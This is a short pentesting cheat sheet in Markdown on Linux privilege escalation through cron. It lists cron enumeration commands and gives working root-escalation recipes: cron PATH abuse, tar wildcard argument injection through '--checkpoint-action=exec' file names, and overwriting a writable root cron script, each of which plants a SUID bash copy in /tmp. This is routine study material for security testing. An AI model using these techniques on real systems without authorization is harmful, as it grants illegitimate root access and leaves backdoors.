---
aliases: 
tags:
  - tech
  - cybsec
  - linux
  - privilege_escalation
  - privesc
author: Mehdi N Tehrani
creat_date: 2023-12-18
category: Cyber Security
subcategory: Linux Pentesting
---

```
crontab -l
ls -lah /var/spool/cron
ls -la /etc/ | grep cron
ls -la /etc/cron
cat /etc/cron
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#pspy
Use [PSPY](https://github.com/DominicBreuker/pspy) to look out for any new processes that run:


# Cron Paths
for files without full path defined, cron looks in PATH. This can be abused by the attacker.

example:
```
$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash;' > <run_by_cron_as_root>
$ chmod +x /tmp/bash
$ /tmp/bash -p
# whoami
root
```

# Wildcards
#wildcard
can be used outside of cron as well
useful when we don't have write access to the script run by cron job as root
if we have write permission we can use **cron file overwrite** exploit
## Example
if `tar` is being called in a cron job with a wildcard e.g.
`cd /home/user`
`tar czf <file.tar.gz> *`
this can be abused as such:
```
$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash;' > malscript.sh
$ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=sh\ malscript.sh

# after the next cron cycle, the following command gives us a root shell
$ /tmp/bash -p
# whoami
root
```

# Cron File Overwrite
#cron_file_overwrite #overwrite  
when we have write permission to the script run by cron job running it as root
we can simply overwrite the content of the script with something like:
`cp /bin/bash /tmp/bash; chmod +s /tmp/bash;`
once cron job is run, the following can be done:
```
$ /tmp/bash -p
# whoami
root
```
